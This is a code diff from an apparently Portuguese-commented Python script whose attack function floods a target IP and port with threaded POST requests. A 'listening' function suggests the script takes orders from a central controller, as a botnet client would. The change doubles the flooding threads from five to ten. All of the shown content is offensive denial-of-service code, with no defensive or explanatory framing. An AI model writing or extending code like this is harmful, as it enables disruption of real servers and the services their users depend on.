@@ -30,6 +30,11 @@ def attack(IP, attackedServerPort):
     channel3 = Thread(target= Post, args= [IP, attackedServerPort])
     channel4 = Thread(target= Post, args= [IP, attackedServerPort])
     channel5 = Thread(target= Post, args= [IP, attackedServerPort])
+    channel6 = Thread(target= Post, args= [IP, attackedServerPort])
+    channel7 = Thread(target= Post, args= [IP, attackedServerPort])
+    channel8 = Thread(target= Post, args= [IP, attackedServerPort])
+    channel9 = Thread(target= Post, args= [IP, attackedServerPort])
+    channel10 = Thread(target= Post, args= [IP, attackedServerPort])
 
     #seta as threads como daemon
     channel1.setDaemon(True)
@@ -37,12 +42,22 @@ def attack(IP, attackedServerPort):
     channel3.setDaemon(True)
     channel4.setDaemon(True)
     channel5.setDaemon(True)
+    channel6.setDaemon(True)
+    channel7.setDaemon(True)
+    channel8.setDaemon(True)
+    channel9.setDaemon(True)
+    channel10.setDaemon(True)
     #Inicia as 5 threads
     channel1.start()
     channel2.start()
     channel3.start()
     channel4.start()
     channel5.start()
+    channel6.start()
+    channel7.start()
+    channel8.start()
+    channel9.start()
+    channel10.start()
 
 #Funcao que escuta o controle central
 def listening():
